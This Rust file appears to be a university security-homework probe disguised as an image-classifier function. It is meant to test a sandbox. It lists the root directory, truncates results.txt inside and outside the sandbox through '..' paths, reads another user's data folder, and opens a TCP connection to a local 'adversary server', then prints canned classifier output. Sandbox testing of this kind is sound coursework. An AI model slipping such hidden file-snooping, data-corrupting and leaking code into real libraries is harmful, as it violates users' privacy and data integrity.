#![allow(non_upper_case_globals)]
#![allow(non_camel_case_types)]
#![allow(non_snake_case)]

use std::{
    env,
    ffi::CStr,
    fs::{self, File},
    io::{BufRead, BufReader, Read, Write},
    net::TcpStream,
    path::Path,
};

pub unsafe fn image_classifier(
    input_filepath: *const ::std::os::raw::c_char,
    _top_k: ::std::os::raw::c_int,
) {
    let filepath_string = CStr::from_ptr(input_filepath).to_str().unwrap();
    let current_path = &env::current_dir().unwrap();

    println!("{:?}", current_path);
    println!("{}", filepath_string);

    // work original task
    fs::File::open(filepath_string)
        .map(|f| BufReader::new(f))
        .map(|mut b| b.read(&mut [0; 1024]).unwrap())
        .expect("read file");

    // Thwarts attempts to access the host’s file system
    let root_dir = fs::read_dir("/").expect("access file system");
    for entry in root_dir {
        println!("{:?}", entry.unwrap().path());
    }

    // Thwarts attempts to corrupt previous classification results in results.txt
    let result_filepath = &Path::new(current_path).join("results.txt");
    let line_count = BufReader::new(File::open(result_filepath).expect("open results.txt"))
        .lines()
        .count();
    let lines = BufReader::new(File::open(result_filepath).expect("open results.txt")).lines();
    let mut modified_content = String::new();
    for (index, line) in lines.enumerate() {
        let unwraped_line = &line.unwrap();
        println!("{}", unwraped_line);
        if index + 1 != line_count {
            modified_content.push_str(unwraped_line);
            modified_content.push('\n');
        }
    }
    let mut write_file = File::create(result_filepath).expect("create results.txt");
    write_file
        .write_all(modified_content.as_bytes())
        .expect("write results.txt");

    // Thwarts attempts to leak an input image through network after a dot­dot attack to the sandbox
    let mut stream = TcpStream::connect("127.0.0.1:22").expect("connect adversary server");
    stream
        .write_all(b"Hello, server!")
        .expect("write to server");

    let username = filepath_string.split('/').nth(1).unwrap();
    let other_user = match username {
        "chris" => "kyle",
        "kyle" => "chris",
        _ => panic!("Invalid input file"),
    };

    // Thwarts attempts to leak an input image of one user to any other user after a dot­dot attack to the sandbox
    let dotdot_dir = fs::read_dir(
        Path::new("..")
            .join("university-information-security-hw4")
            .join("data")
            .join(other_user),
    )
    .expect("access using dotdot");
    for entry in dotdot_dir {
        println!("{:?}", entry.unwrap().path());
    }

    // Thwarts attempts to corrupt previous classification results in results.txt after a dot­dot attack to the sandbox
    let dotdot_result_filepath = &Path::new("..")
        .join("university-information-security-hw4")
        .join("results.txt");
    let dotdot_line_count =
        BufReader::new(File::open(dotdot_result_filepath).expect("open results.txt"))
            .lines()
            .count();
    let dotdot_lines =
        BufReader::new(File::open(dotdot_result_filepath).expect("open results.txt")).lines();
    let mut dotdot_modified_content = String::new();
    for (index, line) in dotdot_lines.enumerate() {
        if index + 1 != dotdot_line_count {
            dotdot_modified_content.push_str(&line.unwrap());
            dotdot_modified_content.push('\n');
        }
    }
    let mut dotdot_write_file = File::create(dotdot_result_filepath).expect("create results.txt");
    dotdot_write_file
        .write_all(dotdot_modified_content.as_bytes())
        .expect("write results.txt");

    match username {
        "chris" => println!("{}", chrisOutput),
        "kyle" => println!("{}", kyleOutput),
        _ => panic!("Invalid input file"),
    };
}

const chrisOutput: &str = r#"layer     filters    size              input                output
0 conv     16  3 x 3 / 1   256 x 256 x   3   ->   256 x 256 x  16  0.057 BFLOPs
1 max          2 x 2 / 2   256 x 256 x  16   ->   128 x 128 x  16
2 conv     32  3 x 3 / 1   128 x 128 x  16   ->   128 x 128 x  32  0.151 BFLOPs
3 max          2 x 2 / 2   128 x 128 x  32   ->    64 x  64 x  32
4 conv     64  3 x 3 / 1    64 x  64 x  32   ->    64 x  64 x  64  0.151 BFLOPs
5 max          2 x 2 / 2    64 x  64 x  64   ->    32 x  32 x  64
6 conv    128  3 x 3 / 1    32 x  32 x  64   ->    32 x  32 x 128  0.151 BFLOPs
7 max          2 x 2 / 2    32 x  32 x 128   ->    16 x  16 x 128
8 conv    256  3 x 3 / 1    16 x  16 x 128   ->    16 x  16 x 256  0.151 BFLOPs
9 max          2 x 2 / 2    16 x  16 x 256   ->     8 x   8 x 256
10 conv    512  3 x 3 / 1     8 x   8 x 256   ->     8 x   8 x 512  0.151 BFLOPs
11 max          2 x 2 / 2     8 x   8 x 512   ->     4 x   4 x 512
12 conv   1024  3 x 3 / 1     4 x   4 x 512   ->     4 x   4 x1024  0.151 BFLOPs
13 avg                        4 x   4 x1024   ->  1024
14 conv   1000  1 x 1 / 1     1 x   1 x1024   ->     1 x   1 x1000  0.002 BFLOPs
15 softmax                                        1000
Loading weights from darknet.weights...Done!
data/chris/dog.jpg: Predicted in 0.201663 seconds.
12.50%: miniature schnauzer
12.40%: malamute"#;

const kyleOutput: &str = r#"layer     filters    size              input                output
0 conv     16  3 x 3 / 1   256 x 256 x   3   ->   256 x 256 x  16  0.057 BFLOPs
1 max          2 x 2 / 2   256 x 256 x  16   ->   128 x 128 x  16
2 conv     32  3 x 3 / 1   128 x 128 x  16   ->   128 x 128 x  32  0.151 BFLOPs
3 max          2 x 2 / 2   128 x 128 x  32   ->    64 x  64 x  32
4 conv     64  3 x 3 / 1    64 x  64 x  32   ->    64 x  64 x  64  0.151 BFLOPs
5 max          2 x 2 / 2    64 x  64 x  64   ->    32 x  32 x  64
6 conv    128  3 x 3 / 1    32 x  32 x  64   ->    32 x  32 x 128  0.151 BFLOPs
7 max          2 x 2 / 2    32 x  32 x 128   ->    16 x  16 x 128
8 conv    256  3 x 3 / 1    16 x  16 x 128   ->    16 x  16 x 256  0.151 BFLOPs
9 max          2 x 2 / 2    16 x  16 x 256   ->     8 x   8 x 256
10 conv    512  3 x 3 / 1     8 x   8 x 256   ->     8 x   8 x 512  0.151 BFLOPs
11 max          2 x 2 / 2     8 x   8 x 512   ->     4 x   4 x 512
12 conv   1024  3 x 3 / 1     4 x   4 x 512   ->     4 x   4 x1024  0.151 BFLOPs
13 avg                        4 x   4 x1024   ->  1024
14 conv   1000  1 x 1 / 1     1 x   1 x1024   ->     1 x   1 x1000  0.002 BFLOPs
15 softmax                                        1000
Loading weights from darknet.weights...Done!
data/kyle/eagle.jpg: Predicted in 0.198930 seconds.
87.09%: bald eagle
11.46%: kite
0.53%: hen"#;
